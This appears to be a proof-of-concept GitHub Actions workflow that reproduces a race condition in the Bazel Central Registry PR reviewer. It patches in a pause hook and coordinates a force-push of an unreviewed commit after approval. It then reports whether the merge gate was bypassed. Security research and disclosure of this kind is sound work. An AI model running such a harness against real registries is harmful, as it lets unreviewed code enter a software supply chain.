name: BCR TOCTOU Orchestrator PoC

on:
  workflow_dispatch:
    inputs:
      pr_number:
        description: 'External-fork PR number to test'
        required: true
        type: number

permissions:
  contents: read
  issues: write
  pull-requests: write
  actions: read

jobs:
  orchestrate:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout exact upstream CI revision
        uses: actions/checkout@v4
        with:
          repository: bazelbuild/continuous-integration
          ref: 957b0ac44549a70ccb951361b804d07d955aeb79
          path: ci
          persist-credentials: false

      - name: Verify helper token is configured
        env:
          HELPER_TOKEN: ${{ secrets.BCR_PR_REVIEW_HELPER_TOKEN }}
        shell: bash
        run: |
          if [[ -z "$HELPER_TOKEN" ]]; then
            echo 'Missing repository secret BCR_PR_REVIEW_HELPER_TOKEN.' >&2
            exit 1
          fi
          echo 'Helper token secret is present.'

      - name: Run exact reviewer with lab-only synchronization barrier
        env:
          # GITHUB_TOKEN is used only by the lab harness for the sync marker and
          # HEAD polling. The upstream reviewer itself uses HELPER_TOKEN.
          GH_TOKEN: ${{ github.token }}
          INPUT_TOKEN: ${{ secrets.BCR_PR_REVIEW_HELPER_TOKEN }}
          INPUT_ACTION-TYPE: review_prs
          BCR_POC_SYNC: '1'
          PR_NUMBER: ${{ inputs.pr_number }}
        shell: bash
        run: |
          set -euo pipefail

          pr_json() {
            curl -fsS \
              -H "Authorization: Bearer $GH_TOKEN" \
              -H 'Accept: application/vnd.github+json' \
              -H 'X-GitHub-Api-Version: 2022-11-28' \
              "https://api.github.com/repos/${GITHUB_REPOSITORY}/pulls/${PR_NUMBER}"
          }

          initial_json=$(pr_json)
          initial_sha=$(jq -r '.head.sha' <<<"$initial_json")
          head_repo=$(jq -r '.head.repo.full_name' <<<"$initial_json")
          pr_author=$(jq -r '.user.login' <<<"$initial_json")
          echo "Target PR #${PR_NUMBER}"
          echo "PR author=${pr_author}"
          echo "Head repo=${head_repo}"
          echo "Approved state A=${initial_sha}"

          if [[ "$head_repo" == "$GITHUB_REPOSITORY" ]]; then
            echo 'Refusing final external-contributor test: PR head is in the target repository, not an external fork.' >&2
            exit 1
          fi

          python3 - <<'PY'
          from pathlib import Path
          p = Path('ci/actions/bcr-pr-reviewer/index.js')
          s = p.read_text()
          needle = "  // Get all open PRs from the repo\n"
          hook = """  // LAB-ONLY deterministic synchronization hook. No approval, freshness,\n  // module, HEAD, review, or merge decision logic is changed.\n  if (process.env.BCR_POC_SYNC === '1') {\n    console.log('BCR_POC_SYNC_READY');\n    const fs = require('fs');\n    while (!fs.existsSync('/tmp/bcr_poc_go')) {\n      await new Promise(resolve => setTimeout(resolve, 100));\n    }\n    console.log('BCR_POC_SYNC_GO');\n  }\n\n"""
          if needle not in s:
              raise SystemExit('sync insertion point not found')
          p.write_text(s.replace(needle, hook + needle, 1))
          PY

          echo '--- lab-only source diff ---'
          git -C ci diff -- actions/bcr-pr-reviewer/index.js || true
          echo '--- end source diff ---'

          rm -f /tmp/bcr_poc_go reviewer.log
          node ci/actions/bcr-pr-reviewer/index.js > reviewer.log 2>&1 &
          reviewer_pid=$!

          ready=0
          for _ in $(seq 1 600); do
            if grep -q 'BCR_POC_SYNC_READY' reviewer.log; then
              ready=1
              break
            fi
            if ! kill -0 "$reviewer_pid" 2>/dev/null; then
              break
            fi
            sleep 0.1
          done

          if [[ "$ready" != 1 ]]; then
            cat reviewer.log
            echo 'Reviewer never reached synchronization point.' >&2
            exit 1
          fi

          echo 'Reviewer passed global dismissal wait and is paused before listing open PRs.'

          curl -fsS \
            -X POST \
            -H "Authorization: Bearer $GH_TOKEN" \
            -H 'Accept: application/vnd.github+json' \
            -H 'X-GitHub-Api-Version: 2022-11-28' \
            "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${PR_NUMBER}/comments" \
            -d "{\"body\":\"BCR_POC_SYNC_READY_FINAL: reviewer passed global dismissal wait. External contributor should now amend A and force-push unreviewed B. A=${initial_sha}\"}" \
            >/dev/null

          changed=0
          for _ in $(seq 1 600); do
            current_sha=$(pr_json | jq -r '.head.sha')
            if [[ "$current_sha" != "$initial_sha" ]]; then
              changed=1
              echo "Observed external PR HEAD change: A=${initial_sha} -> B=${current_sha}"
              break
            fi
            sleep 0.1
          done

          if [[ "$changed" != 1 ]]; then
            kill "$reviewer_pid" 2>/dev/null || true
            cat reviewer.log
            echo 'Timed out waiting for external contributor to change PR HEAD.' >&2
            exit 1
          fi

          touch /tmp/bcr_poc_go
          rc=0
          wait "$reviewer_pid" || rc=$?

          echo '--- exact reviewer output ---'
          cat reviewer.log
          echo '--- end exact reviewer output ---'
          echo "reviewer_exit=$rc"

          if grep -q "PR ${PR_NUMBER} merged successfully" reviewer.log; then
            echo 'BCR_POC_RESULT=MERGED'
          elif grep -q 'All modified modules have maintainers' reviewer.log; then
            echo 'BCR_POC_RESULT=APPROVAL_GATE_BYPASSED_BUT_NOT_MERGED'
          else
            echo 'BCR_POC_RESULT=NO_BYPASS'
          fi

          exit "$rc"
